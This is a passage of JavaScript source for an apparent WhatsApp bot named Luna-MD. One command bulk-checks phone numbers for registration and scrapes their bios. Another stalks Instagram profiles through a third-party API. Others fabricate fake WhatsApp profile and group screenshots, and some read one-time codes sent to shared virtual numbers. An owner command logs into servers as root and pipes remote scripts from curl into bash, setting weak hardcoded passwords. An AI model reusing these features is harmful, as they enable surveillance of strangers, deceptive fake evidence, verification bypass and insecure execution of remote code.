hasil += `📵 Tanpa Bio / Privasi : ${noBio.length}\n\n`;

if (withBio.length) {

hasil += `*──── DENGAN BIO (${withBio.length}) ────*\n\n`;

for (let x of withBio) {

let waktu = "-";

if (x.setAt && x.setAt !== "-") {

let d = new Date(x.setAt);

if (!isNaN(d)) {
waktu = d.toLocaleString("id-ID");
}

}

hasil += `📱 ${x.nomor}\n`;
hasil += `📝 ${x.bio}\n`;
hasil += `⏰ ${waktu}\n\n`;

}

} else {

hasil += "*──── DENGAN BIO ────*\n(Kosong)\n\n";

}

hasil += `*──── TANPA BIO / PRIVASI (${noBio.length}) ────*\n`;

if (noBio.length) {

hasil += noBio.join("\n");

} else {

hasil += "(Kosong)";

}

await Reply(hasil);

let hasil2 = `*DATA NOMOR TIDAK TERDAFTAR*\n\n`;
hasil2 += `🚫 Total : ${notReg.length}\n\n`;

if (notReg.length) {

hasil2 += notReg.join("\n");

} else {

hasil2 += "(Kosong)";

}

await Reply(hasil2);

} catch (e) {
console.log(e);
Reply("Terjadi kesalahan saat mengecek bio.");
}
}
break;

case "cekbio": {
try {
if (!text) return reply(`Contoh:\n${prefix + command} 62812xxxx,62813xxxx`);

let input = text
.replace(/\n/g, ",")
.replace(/\s/g, "");

let numbers = input.split(",").filter(v => v);

if (numbers.length < 1) return reply("Masukkan minimal 1 nomor.");

Reply(`⏳ Sedang mengecek ${numbers.length} nomor...`);

let withBio = [];
let noBio = [];
let notReg = [];

const batchSize = 15;

for (let i = 0; i < numbers.length; i += batchSize) {

const batch = numbers.slice(i, i + batchSize);

await Promise.allSettled(batch.map(async (nomor) => {

let jid = nomor.replace(/\D/g, "") + "@s.whatsapp.net";

try {

const check = await luna.onWhatsApp(jid);

if (!check || !check[0]?.exists) {
notReg.push(nomor);
return;
}

try {

const status = await luna.fetchStatus(jid);

if (status && status.status && status.status.trim() !== "") {

withBio.push({
nomor,
bio: status.status,
setAt: status.setAt || "-"
});

} else {

noBio.push(nomor);

}

} catch {

noBio.push(nomor);

}

} catch {

notReg.push(nomor);

}

}));

await new Promise(resolve => setTimeout(resolve, 1000));

}

let hasil = `*HASIL CEK BIO*\n\n`;
hasil += `✅ Total : ${numbers.length}\n`;
hasil += `📝 Dengan Bio : ${withBio.length}\n`;
hasil += `📵 Tanpa Bio : ${noBio.length}\n`;
hasil += `🚫 Tidak Terdaftar : ${notReg.length}\n\n`;

if (withBio.length) {

hasil += "*── DENGAN BIO ──*\n\n";

for (let x of withBio) {

let waktu = "-";

if (x.setAt && x.setAt !== "-") {

let d = new Date(x.setAt);

if (!isNaN(d)) {

waktu = d.toLocaleString("id-ID");

}

}

hasil += `📱 ${x.nomor}\n`;
hasil += `📝 ${x.bio}\n`;
hasil += `⏰ ${waktu}\n\n`;

}

}

if (noBio.length) {

hasil += "*── TANPA BIO ──*\n";

hasil += noBio.join("\n");

hasil += "\n\n";

}

if (notReg.length) {

hasil += "*── TIDAK TERDAFTAR ──*\n";

hasil += notReg.join("\n");

}

Reply(hasil);

} catch (e) {
console.log(e);
Reply("Terjadi kesalahan saat mengecek bio.");
}
}
break;

case 'fakeprofil': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!/image/.test(mime)) return m.reply('Silakan reply foto untuk dijadikan foto profil!');
    
    if (!text) return m.reply('Format salah!\nContoh: *fakeprofil Luna-MD|+628xxx|Luna-MD*');
    let [username, nomor, bio] = text.split('|');
    if (!username || !nomor || !bio) return m.reply('Format harus menggunakan pemisah |\nContoh: *Nama|Nomor|Bio*');

    await m.reply('Sedang memproses, mohon tunggu...');

    try {
        const { createCanvas, loadImage } = require('@napi-rs/canvas'); 
        
        const bgUrl = 'https://img2.pixhost.to/images/9139/747073049_rafaofficial.jpg';
        const background = await loadImage(bgUrl);
        
        const canvas = createCanvas(1125, 2436);
        const ctx = canvas.getContext('2d');
        
        ctx.drawImage(background, 0, 0, 1125, 2436);
        
        let imgBuffer = await q.download();
        const profileImg = await loadImage(imgBuffer);
        
        const avatarX = 562.5; 
        const avatarY = 450;   
        const radius = 172;    
        
        ctx.save();
        ctx.beginPath();
        ctx.arc(avatarX, avatarY, radius, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.clip();
        
        ctx.drawImage(profileImg, avatarX - radius, avatarY - radius, radius * 2, radius * 2);
        ctx.restore();
        
        ctx.textBaseline = 'middle';
        
        ctx.textAlign = 'center';
        ctx.font = 'bold 74px Arial, sans-serif'; 
        ctx.fillStyle = '#FFFFFF';
        ctx.fillText(username.trim(), 562.5, 680); 
        
        ctx.font = '500 44px Arial, sans-serif';
        ctx.fillStyle = '#8E8E93';
        ctx.fillText(nomor.trim(), 562.5, 775); 
        
        ctx.textAlign = 'left'; 
        ctx.font = '44px Arial, sans-serif';
        ctx.fillStyle = '#FFFFFF';
        
        ctx.fillText(bio.trim(), 95, 1160);
        
        let buffer = canvas.toBuffer('image/jpeg');
        await luna.sendMessage(m.chat, { image: buffer, caption: `*Fake Profile Selesai!*` }, { quoted: m });
        
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan pada sistem Canvas.');
    }
}
break;

case 'fakegrup': {
try {
if (!/image/.test(mime)) return m.reply(example("Luna-MD|500 dengan kirim/reply foto"))
if (!text) return m.reply(example("Luna-MD|500"))

let [nama, peserta] = text.split("|")

if (!nama || !peserta) {
return m.reply(`Format salah!\n\nContoh:\n${prefix + command} Luna-MD|500`)
}

await m.reply("⏳ Sedang membuat Fake Group...")

const media = await luna.downloadAndSaveMediaMessage(qmsg)

const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to')

let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
'luna-md.jpg'
)

const profile = directLink.toString()

const api = `https://api.azbry.com/api/maker/igc?profile=${encodeURIComponent(profile)}&nama=${encodeURIComponent(nama)}&peserta=${encodeURIComponent(peserta)}`

await luna.sendMessage(m.chat, {
image: {
url: api
},
caption: `乂 *FAKE GROUP BERHASIL*

📛 *Nama Grup :* ${nama}
👥 *Jumlah Peserta :* ${peserta}

> Powered By Luna-MD`
}, {
quoted: m
})

fs.unlinkSync(media)

} catch (e) {
console.log(e)
m.reply(`❌ Terjadi kesalahan!\n\n${e.message}`)
}
}
break

case 'igstalk': {
try {
const axios = require('axios')

if (!text) return m.reply(`*Contoh Penggunaan :*\n${prefix + command} timothyronaldd`)

await m.reply('⏳ Sedang mengambil data Instagram...')

const { data } = await axios.get(`https://api.synoxcloud.xyz/stalker/instagram?username=${encodeURIComponent(text)}`)

if (!data.status) {
return m.reply('❌ Username tidak ditemukan atau gagal mengambil data.')
}

const meta = data.result.metadata || {}
const user = data.result.stories?.data?.user || {}

const caption = `
╭━━━〔 📸 INSTAGRAM STALK 〕━━⬣
┃ 👤 Username : ${user.username || text}
┃ 🏷️ Nama : ${user.full_name || '-'}
┃ ?? ID : ${user.id || '-'}
┃ 🌍 Negara : ${data.result.stories?.data?.country || '-'}
┃ ✔️ Verified : ${user.is_verified ? 'Ya' : 'Tidak'}
┃ 🔒 Private : ${user.is_private ? 'Ya' : 'Tidak'}
┃ 📂 Kategori : ${user.category_name || '-'}
┃ 💼 Business : ${user.business_category_name || '-'}
┃
┃ 📝 Bio :
┃ ${user.biography || '-'}
┃
┃ 👥 Followers : ${meta.followers || user.edge_followed_by || 0}
┃ ➕ Following : ${meta.following || user.edge_follow || 0}
┃ 🖼️ Postingan : ${meta.posts || user.edges_count || 0}
┃ 🔗 Website :
┃ ${user.external_url || '-'}
╰━━━━━━━━━━━━━━━━━━⬣

📦 *Postingan Terbaru:* ${user.edges?.length || 0}
`

await luna.sendMessage(m.chat, {
image: {
url: meta.avatar || user.profile_pic_url
},
caption
}, {
quoted: m
})

if (user.edges && user.edges.length > 0) {
let teks = '📸 *Daftar Postingan Terbaru*\n\n'

user.edges.slice(0, 10).forEach((v, i) => {
const tanggal = v.taken_at
? new Date(v.taken_at * 1000).toLocaleString('id-ID')
: '-'

teks += `*${i + 1}. ${v.is_video ? '?? Video' : '🖼️ Foto'}*\n`
teks += `❤️ Like : ${v.like_count || 0}\n`
teks += `💬 Komentar : ${v.comment_count || 0}\n`
teks += `📅 Upload : ${tanggal}\n`
if (v.video_url) teks += `🎬 Video : ${v.video_url}\n`
teks += `🖼️ Gambar : ${v.display_url}\n\n`
})

await m.reply(teks)
}

} catch (e) {
console.log(e)
m.reply(`❌ Terjadi kesalahan.\n\n${e.message}`)
}
}
break

case 'gachano': {
  try {
    const targetChat = m.chat || from;
    
    await luna.sendMessage(targetChat, { text: "Tunggu sebentar, sedang mengambil data number..." }, { quoted: m });

    const response = await axios.get('https://api.synoxcloud.xyz/tools/virtual-numbers');
    
    if (!response || !response.data || !response.data.result || !response.data.result.numbers) {
      return luna.sendMessage(targetChat, { text: "Gagal mengambil data, struktur API berubah atau server sedang down." }, { quoted: m });
    }

    const allNumbers = response.data.result.numbers; 

    if (!Array.isArray(allNumbers) || allNumbers.length === 0) {
      return luna.sendMessage(targetChat, { text: "Stok nomor dari API sedang kosong." }, { quoted: m });
    }

    const randomIndex = Math.floor(Math.random() * allNumbers.length);
    const selectedData = allNumbers[randomIndex];
    
    if (!selectedData) {
      return luna.sendMessage(targetChat, { text: "Gagal mengacak nomor, silakan coba lagi." }, { quoted: m });
    }

    const nomor = selectedData.number; 
    const negara = selectedData.country || "Tidak diketahui";
    const bendera = selectedData.flag || ""; 

    if (!nomor) {
      return luna.sendMessage(targetChat, { text: "Format nomor tidak ditemukan dalam data API." }, { quoted: m });
    }

    
    let txt = `*GACHA VIRTUAL NUMBER* 
◦ Nomor :
${nomor}

◦ Negara :
${negara} ${bendera}
`

    const MenuX = {
      interactiveMessage: {
        title: txt,
        footer: "Luna-MD Virtual Number Tools",
        thumbnail: "https://img2.pixhost.to/images/9055/745533062_rafaofficial.jpg", 
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({
            limited_time_offer: {
              text: "Virtual Number",
              url: "https://api.synoxcloud.xyz",
              copy_code: nomor, 
              expiration_time: Date.now() * 999
            }
          }),
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "🔄 Gacha Lagi",
                id: ".gachano"
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "💬 Cek OTP",
                id: `.cekotpgacha ${nomor}`
              })
            }
          ]
        }
      }
    };

    await luna.sendMessage(
      targetChat,
      MenuX,
      { quoted: m }
    );

  } catch (error) {
    console.error(error);
    const targetChat = m.chat || from;
    await luna.sendMessage(targetChat, { text: "Terjadi kesalahan saat menghubungi server API Virtual Numbers." }, { quoted: m });
  }
}
break;

case 'cekotpgacha': {
  const targetNumber = args.join(" ") || text; 
  const targetChat = m.chat || from;
  
  if (!targetNumber) return luna.sendMessage(targetChat, { text: "Format salah. Contoh: .cekotpgacha +6281234567890" }, { quoted: m });

  try {
    const encodedNumber = encodeURIComponent(targetNumber);
    const otpResponse = await axios.get(`https://api.synoxcloud.xyz/tools/otp-checker?number=${encodedNumber}`);
    const resData = otpResponse.data;

    if (resData.status) {
      let otpTxt = `*HASIL OTP CHECKER* 📥
◦ Nomor :
${targetNumber}

◦ Status :
${resData.message}

◦ Total OTP :
${resData.result.total}
`
      
      if (resData.result.otps && resData.result.otps.length > 0) {
        otpTxt += `\n*Daftar OTP:* \n`;
        resData.result.otps.forEach((otp, i) => {
          otpTxt += `${i + 1}. ${otp}\n`;
        });
      } else {
        otpTxt += `\n_Belum ada OTP baru yang masuk._\n`;
      }

      const MenuX = {
        interactiveMessage: {
          title: otpTxt,
          footer: "Luna-MD OTP Checker",
          thumbnail: "https://img2.pixhost.to/images/9055/745533062_rafaofficial.jpg", 
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "Cek Gacha OTP",
                url: "https://api.synoxcloud.xyz",
                copy_code: targetNumber, 
                expiration_time: Date.now() * 999
              }
            }),
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🔄 Cek Ulang OTP",
                  id: `.cekotpgacha ${targetNumber}`
                })
              }
            ]
          }
        }
      };

      await luna.sendMessage(
        targetChat,
        MenuX,
        { quoted: m }
      );
    } else {
      await luna.sendMessage(targetChat, { text: `Gagal mengecek OTP: ${resData.message}` }, { quoted: m });
    }

  } catch (error) {
    console.error(error);
    await luna.sendMessage(targetChat, { text: "Terjadi kesalahan saat menghubungi server API OTP Checker." }, { quoted: m });
  }
}
break;

case "installpanel3": {
    if (!isOwner) return m.reply(mess.owner)

    if (!q || !q.includes("|")) {
        return m.reply(
            `*Format salah!*\n\n` +
            `*Contoh:*\n` +
            `${prefix + command} ipvps|pwvps|panel.com|node.com|ramserver\n\n` +
            `*Contoh lengkap:*\n` +
            `${prefix + command} 192.168.1.100|password123|panel.example.com|node.example.com|100000`
        )
    }

    const vii = q.split("|")

    if (vii.length < 5) {
        return m.reply(
            `*Format Salah!*\n\n` +
            `*Contoh:*\n` +
            `${prefix + command} ipvps|pwvps|panel.com|node.com|ramserver`
        )
    }

    const ipHost = vii[0]?.trim() || ""
    const passwordVps = vii[1]?.trim() || ""
    const domainPanel = vii[2]?.trim() || ""
    const domainNode = vii[3]?.trim() || ""
    const ramServer = vii[4]?.trim() || ""

    if (!ipHost || !passwordVps || !domainPanel || !domainNode || !ramServer) {
        return m.reply("❌ Semua parameter harus diisi!")
    }

    const cooldown = checkCooldown(m.sender, command, 1800000) 
    if (!cooldown.allowed) {
        return m.reply(`⏱️ Tunggu *${cooldown.remainingTime} detik* sebelum menggunakan command ini lagi.`)
    }
    recordUsage(m.sender, command, 1800000)

    const ssh2 = require("ssh2")
    const ress = new ssh2.Client()

    const connSettings = {
        host: ipHost,
        port: 22,
        username: "root",
        password: passwordVps,
        readyTimeout: 30000
    }

    const passwordPanel = "admin001"
    const commandPanel = "bash <(curl -s https://pterodactyl-installer.se)"

    
    const InstallNodes = async () => {
        return new Promise((resolve, reject) => {
            ress.exec(
                "bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)",
                { pty: true },
                (err, stream) => {
                    if (err) return reject(err)

                    stream
                        .on("close", async (code) => {
                            const successMsg =
                                `*Install Panel Telah Berhasil ✅*\n\n` +
                                `*Berikut Detail Akun Panel Kamu:*\n\n` +
                                `*👤 Username:* admin\n` +
                                `*🔐 Password:* ${passwordPanel}\n` +
                                `*🌐 URL:* https://${domainPanel}\n\n` +
                                `Silahkan setting allocation & ambil token node di node yang sudah dibuat oleh bot\n\n` +
                                `*Cara menjalankan wings:*\n` +
                                `${prefix}startwings ${ipHost}|${passwordVps}|tokennode`

                            await luna.sendMessage(m.chat, { text: successMsg }, { quoted: m })
                            ress.end()
                            resolve()
                        })
                        .on("data", (data) => {
                            const out = data.toString()
                            console.log("Node Install:", out)

                            if (out.includes("Masukkan nama lokasi:")) stream.write("Singapore\n")
                            else if (out.includes("Masukkan deskripsi lokasi:")) stream.write("Node By Luna-MD\n")
                            else if (out.includes("Masukkan domain:")) stream.write(`${domainNode}\n`)
                            else if (out.includes("Masukkan nama node:")) stream.write("Luna-MD Node\n")
                            else if (out.includes("Masukkan RAM (dalam MB):")) stream.write(`${ramServer}\n`)
                            else if (out.includes("Masukkan jumlah maksimum disk space (dalam MB):")) stream.write(`${ramServer}\n`)
                            else if (out.includes("Masukkan Locid:")) stream.write("1\n")
                        })
                        .stderr.on("data", (data) => {
                            console.error("Node Stderr:", data.toString())
                        })
                }
            )
        })
    }

    
    const instalWings = async () => {
        return new Promise((resolve, reject) => {
            ress.exec(commandPanel, { pty: true }, (err, stream) => {
                if (err) {
                    m.reply(`❌ Gagal memulai instalasi Wings: ${err.message}`)
                    ress.end()
                    return reject(err)
                }

                stream
                    .on("close", async (code) => {
                        if (code === 0) {
                            resolve(await InstallNodes())
                        } else {
                            reject(new Error(`Wings installation failed with code ${code}`))
                        }
                    })
                    .on("data", (data) => {
                        const out = data.toString()
                        console.log("Wings Install:", out)

                        if (out.includes("Input 0-6")) stream.write("1\n")
                        else if (out.includes("(y/N)")) stream.write("y\n")
                        else if (out.includes("Enter the panel address (blank for any address)")) stream.write(`${domainPanel}\n`)
                        else if (out.includes("Database host username (pterodactyluser)")) stream.write("admin\n")
                        else if (out.includes("Database host password")) stream.write("admin\n")
                        else if (out.includes("Set the FQDN to use for Let's Encrypt (node.example.com)")) stream.write(`${domainNode}\n`)
                        else if (out.includes("Enter email address for Let's Encrypt")) stream.write("admin@gmail.com\n")
                    })
                    .stderr.on("data", (data) => {
                        console.error("Wings Install Error:", data.toString())
                    })
            })
        })
    }

    
    const instalPanel = async () => {
        return new Promise((resolve, reject) => {
            ress.exec(commandPanel, { pty: true }, (err, stream) => {
                if (err) return reject(err)

                stream
                    .on("close", async (code) => {
                        if (code === 0) {
                            resolve(await instalWings())
                        } else {
                            reject(new Error(`Panel installation failed with code ${code}`))
                        }
                    })
                    .on("data", (data) => {
                        const out = data.toString()
                        console.log("Panel Install:", out)

                        if (out.includes("Input 0-6")) stream.write("0\n")
                        else if (out.includes("(y/N)")) stream.write("y\n")
                        else if (out.includes("Database name (panel)")) stream.write("\n")
                        else if (out.includes("Database username (pterodactyl)")) stream.write("admin\n")
                        else if (out.includes("Password (press enter to use randomly generated password)")) stream.write("admin\n")
                        else if (out.includes("Select timezone [Europe/Stockholm]")) stream.write("Asia/Jakarta\n")
                        else if (out.includes("Provide the email address that will be used to configure Let's Encrypt and Pterodactyl")) stream.write("admin@gmail.com\n")
                        else if (out.includes("Email address for the initial admin account")) stream.write("admin@gmail.com\n")
                        else if (out.includes("Username for the initial admin account")) stream.write("admin\n")
                        else if (out.includes("First name for the initial admin account")) stream.write("admin\n")
                        else if (out.includes("Last name for the initial admin account")) stream.write("admin\n")
                        else if (out.includes("Password for the initial admin account")) stream.write(`${passwordPanel}\n`)
                        else if (out.includes("Set the FQDN of this panel (panel.example.com)")) stream.write(`${domainPanel}\n`)
                        else if (out.includes("Do you want to automatically configure UFW (firewall)")) stream.write("y\n")
                        else if (out.includes("Do you want to automatically configure HTTPS using Let's Encrypt? (y/N)")) stream.write("y\n")
                        else if (out.includes("Select the appropriate number [1-2] then [enter]")) stream.write("1\n")
                        else if (out.includes("I agree that this HTTPS request is performed (y/N)")) stream.write("y\n")
                        else if (out.includes("Proceed anyways")) stream.write("y\n")
                        else if (out.includes("(yes/no)")) stream.write("y\n")
                        else if (out.includes("Initial configuration completed. Continue with installation? (y/N)")) stream.write("y\n")
                        else if (out.includes("Still assume SSL? (y/N)")) stream.write("y\n")
                        else if (out.includes("Please read the Terms of Service")) stream.write("y\n")
                        else if (out.includes("(A)gree/(C)ancel:")) stream.write("A\n")
                    })
                    .stderr.on("data", (data) => {
                        console.error("Panel Stderr:", data.toString())
                    })
            })
        })
    }

    
    ress.on("ready", async () => {
        try {
            await luna.sendMessage(m.chat, {
                text:
                    `⚙️ *Memproses Install Server Panel*\n\n` +
                    `*🌐 IP Address:* ${ipHost}\n` +
                    `*🖥️ Domain Panel:* ${domainPanel}\n` +
                    `*?? Domain Node:* ${domainNode}\n` +
                    `*💾 RAM Server:* ${ramServer} MB\n\n` +
                    `⏳ Mohon tunggu *10-20 menit* hingga proses install selesai...`
            }, { quoted: m })

            await instalPanel()
        } catch (error) {
            await luna.sendMessage(m.chat, {
                text: `❌ Error saat instalasi:\n${error.message}`
            }, { quoted: m })
            try { ress.end() } catch {}
        }
    })

    ress.on("error", async (err) => {
        await luna.sendMessage(m.chat, {
            text: `❌ Gagal terhubung ke server:\n${err.message}\n\nPastikan IP & password VPS benar dan SSH aktif di port 22.`
        }, { quoted: m })
        try { ress.end() } catch {}
    })

    try {
        ress.connect(connSettings)
    } catch (error) {
        await luna.sendMessage(m.chat, {
            text: `❌ Gagal menghubungkan:\n${error.message}`
        }, { quoted: m })
    }
}
break

case "ffnews": {
try {
const axios = require("axios")

await m.reply("⏳ Mengambil berita Free Fire...")

const { data } = await axios.get("https://api.nexray.eu.cc/berita/ffnews")

if (!data.status) {
return m.reply("❌ Gagal mengambil berita.")
}

const berita = data.result.data

if (!berita || berita.length === 0) {
return m.reply("❌ Berita tidak ditemukan.")
}

let teks = `╭━━〔 📰 *FREE FIRE NEWS* 〕━━⬣
┃ 📑 Total : ${data.result.total}
┃ 🕒 Update : ${data.timestamp}
╰━━━━━━━━━━━━━━⬣

`

for (let i = 0; i < berita.length; i++) {
teks += `*${i + 1}. ${berita[i].title}*\n`
teks += `📅 ${berita[i].date}\n`
teks += `🔗 ${berita[i].link}\n\n`
}

await luna.sendMessage(m.chat, {
text: teks
}, { quoted: m })

} catch (e) {
console.log(e)
m.reply(`❌ Error\n${e.message}`)
}
}
break

case "cine": {
try {
const fs = require("fs")
const axios = require("axios")
const { ImageUploadService } = require("node-upload-images")

if (!/image/.test(mime))
return m.reply(`Reply foto dengan caption *${prefix + command}*`)

await m.reply("⏳ Mengupload gambar ke Pixhost...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")
let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"luna-md.jpg"
)

fs.unlinkSync(media)

await m.reply("🎬 Sedang membuat efek Cinematic...")

const response = await axios({
method: "GET",
url: `https://api.nexray.eu.cc/ephoto/cinematic?url=${encodeURIComponent(directLink)}`,
responseType: "arraybuffer",
validateStatus: () => true
})

const contentType = response.headers["content-type"] || ""


if (contentType.startsWith("image/")) {
return await luna.sendMessage(
m.chat,
{
image: Buffer.from(response.data),
caption: "✅ Berhasil membuat efek Cinematic."
},
{ quoted: m }
)
}


let json = {}
try {
json = JSON.parse(Buffer.from(response.data).toString())
} catch {}

if (!json.status) {
return m.reply(`❌ ${json.error || json.message || "Gagal memproses gambar."}`)
}

let hasil =
json.result ||
json.result_url ||
json.url ||
json.image ||
json.output ||
json.data?.url ||
json.data?.result

if (!hasil) {
return m.reply("❌ URL hasil tidak ditemukan.")
}

await luna.sendMessage(
m.chat,
{
image: { url: hasil },
caption: "✅ Berhasil membuat efek Cinematic."
},
{ quoted: m }
)

} catch (e) {
console.log(e.response?.data || e)
m.reply(`❌ Error\n${e.response?.data?.error || e.response?.data?.message || e.message}`)
}
}
break

case "figure2": {
try {
const fs = require("fs")
const axios = require("axios")
const { ImageUploadService } = require("node-upload-images")

if (!/image/.test(mime))
return m.reply(`Reply foto dengan caption *${prefix + command}*`)

await m.reply("⏳ Mengupload gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")
let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"luna-md.jpg"
)

fs.unlinkSync(media)

await m.reply("🎨 Sedang membuat Figure V2...")

const response = await axios({
method: "GET",
url: `https://api.nexray.eu.cc/ephoto/v2/figure?url=${encodeURIComponent(directLink)}`,
responseType: "arraybuffer",
validateStatus: () => true
})

const contentType = response.headers["content-type"] || ""


if (contentType.startsWith("image/")) {
return await luna.sendMessage(
m.chat,
{
image: Buffer.from(response.data),
caption: "✅ Berhasil membuat Figure V2."
},
{ quoted: m }
)
}


let json = {}
try {
json = JSON.parse(Buffer.from(response.data).toString())
} catch {}

if (!json.status) {
return m.reply(`❌ ${json.error || "Gagal memproses gambar."}`)
}

let hasil =
json.result ||
json.result_url ||
json.url ||
json.image ||
json.output ||
json.data?.url ||
json.data?.result

if (!hasil) {
return m.reply("❌ URL hasil tidak ditemukan.")
}

await luna.sendMessage(
m.chat,
{
image: { url: hasil },
caption: "✅ Berhasil membuat Figure V2."
},
{ quoted: m }
)

} catch (e) {
console.log(e.response?.data || e)
m.reply(`❌ Error\n${e.message}`)
}
}
break

case "figure": {
try {
const fs = require("fs")
const axios = require("axios")
const { ImageUploadService } = require("node-upload-images")

if (!/image/.test(mime))
return m.reply(`Reply foto dengan caption *${prefix + command}*`)

await m.reply("⏳ Mengupload gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")
let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"luna-md.jpg"
)

fs.unlinkSync(media)

await m.reply("🎨 Sedang membuat Figure...")

const response = await axios({
method: "GET",
url: `https://api.nexray.eu.cc/ephoto/v1/figure?url=${encodeURIComponent(directLink)}`,
responseType: "arraybuffer",
validateStatus: () => true
})

const contentType = response.headers["content-type"] || ""


if (contentType.startsWith("image/")) {
return await luna.sendMessage(
m.chat,
{
image: Buffer.from(response.data),
caption: "✅ Berhasil membuat Figure."
},
{ quoted: m }
)
}


let json = {}
try {
json = JSON.parse(Buffer.from(response.data).toString())
} catch {}

if (!json.status) {
return m.reply(`❌ ${json.error || "Gagal memproses gambar."}`)
}

let hasil =
json.result ||
json.result_url ||
json.url ||
json.image ||
json.output ||
json.data?.url ||
json.data?.result

if (!hasil) {
return m.reply("❌ URL hasil tidak ditemukan.")
}

await luna.sendMessage(
m.chat,
{
image: { url: hasil },
caption: "✅ Berhasil membuat Figure."
},
{ quoted: m }
)

} catch (e) {
console.log(e.response?.data || e)
m.reply(`❌ Error\n${e.message}`)
}
}
break

case "fakebook":
case "bookquote": {
  try {

    const fs = require("fs")
    const path = require("path")
    const https = require("https")
    const { createCanvas, loadImage, registerFont } = require("canvas")

    if (global.__canvasBookFont === undefined) {
      global.__canvasBookFont = "sans-serif"

      try {
        const FONT_DIR = path.join(__dirname, "fonts")
        const FONT_PATH = path.join(FONT_DIR, "Quicksand-Bold.ttf")
        const FONT_URL =
          "https://raw.githubusercontent.com/google/fonts/main/ofl/quicksand/static/Quicksand-Bold.ttf"

        if (!fs.existsSync(FONT_DIR)) fs.mkdirSync(FONT_DIR, { recursive: true })

        if (!fs.existsSync(FONT_PATH)) {
          await new Promise((resolve, reject) => {
            const file = fs.createWriteStream(FONT_PATH)
            https
              .get(FONT_URL, (res) => {
                if (res.statusCode !== 200) {
                  file.close()
                  fs.unlink(FONT_PATH, () => {})
                  return reject(new Error(`HTTP ${res.statusCode}`))
                }
                res.pipe(file)
                file.on("finish", () => file.close(resolve))
              })
              .on("error", (err) => {
                fs.unlink(FONT_PATH, () => {})
                reject(err)
              })
          })
        }

        registerFont(FONT_PATH, { family: "BookFont" })
        global.__canvasBookFont = "BookFont"
      } catch (fontErr) {
        console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
      }
    }

    const FONT_FAMILY = global.__canvasBookFont

    if (!text) {
      return m.reply(
        `Contoh penggunaan:\n\n.halaman Jangan pernah hidup dengan standar org lain hidup lh dgn standar mu`
      )
    }

    let quote = text.trim().toUpperCase()

    await m.reply("⏳ Membuat halaman quote...")

    const bg = await loadImage(
      "https://img2.pixhost.to/images/8971/744408275_rafaofficial.jpg"
    )

    const W = bg.width
    const H = bg.height
    const canvas = createCanvas(W, H)
    const ctx = canvas.getContext("2d")

    ctx.drawImage(bg, 0, 0, W, H)

    const boxX = W * 0.265
    const boxY = H * 0.41
    const boxW = W * 0.66
    const boxH = H * 0.37

    ctx.imageSmoothingEnabled = true
    ctx.imageSmoothingQuality = "high"

    function wrapText(ctx, text, maxWidth) {
      const words = text.trim().split(/\s+/)
      let lines = []
      let line = ""
      for (const word of words) {
        const testLine = line ? line + " " + word : word
        if (ctx.measureText(testLine).width > maxWidth) {
          if (line) lines.push(line)
          line = word
        } else {
          line = testLine
        }
      }
      if (line) lines.push(line)
      return lines
    }

    const MAX_WIDTH = boxW
    const MAX_HEIGHT = boxH

    let fontSize = Math.floor(boxW * 0.092)
    let lines = []

    while (fontSize >= 18) {
      ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
      lines = wrapText(ctx, quote, MAX_WIDTH)
      const lineHeight = fontSize * 1.55
      const totalHeight = lines.length * lineHeight
      if (totalHeight <= MAX_HEIGHT) break
      fontSize -= 2
    }

    ctx.textAlign = "left"
    ctx.textBaseline = "alphabetic"

    const lineHeight = fontSize * 1.55
    const totalHeight = lines.length * lineHeight
    const startY = boxY + (boxH - totalHeight) / 2 + fontSize

    
    ctx.fillStyle = "#0d0d0d"
    ctx.shadowColor = "rgba(0,0,0,0.15)"
    ctx.shadowBlur = 1.2
    ctx.shadowOffsetY = 0.5

    ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
    
    for (let i = 0; i < lines.length; i++) {
      let cx = boxX
      const y = startY + i * lineHeight
      const chars = lines[i].split("")
      for (const ch of chars) {
        ctx.fillText(ch, cx, y)
        cx += ctx.measureText(ch).width + fontSize * 0.045
      }
    }

    ctx.shadowBlur = 0
    ctx.shadowOffsetY = 0

    const buffer = canvas.toBuffer("image/png")

    await luna.sendMessage(
      m.chat,
      {
        image: buffer,
        caption: "✅ Halaman Quote Berhasil Dibuat"
      },
      { quoted: m }
    )

  } catch (e) {
    console.log(e)
    m.reply(`❌ Error:\n${e.message}`)
  }
}
break

case "fakeboard":
case "quoteboard": {
  try {

    const fs = require("fs")
    const path = require("path")
    const https = require("https")
    const { createCanvas, loadImage, registerFont } = require("canvas")

    if (global.__canvasSignFont === undefined) {
      global.__canvasSignFont = "sans-serif"

      try {
        const FONT_DIR = path.join(__dirname, "fonts")
        const FONT_PATH = path.join(FONT_DIR, "Poppins-Bold.ttf")
        const FONT_URL =
          "https://raw.githubusercontent.com/google/fonts/main/ofl/poppins/Poppins-Bold.ttf"

        if (!fs.existsSync(FONT_DIR)) fs.mkdirSync(FONT_DIR, { recursive: true })

        if (!fs.existsSync(FONT_PATH)) {
          await new Promise((resolve, reject) => {
            const file = fs.createWriteStream(FONT_PATH)
            https
              .get(FONT_URL, (res) => {
                if (res.statusCode !== 200) {
                  file.close()
                  fs.unlink(FONT_PATH, () => {})
                  return reject(new Error(`HTTP ${res.statusCode}`))
                }
                res.pipe(file)
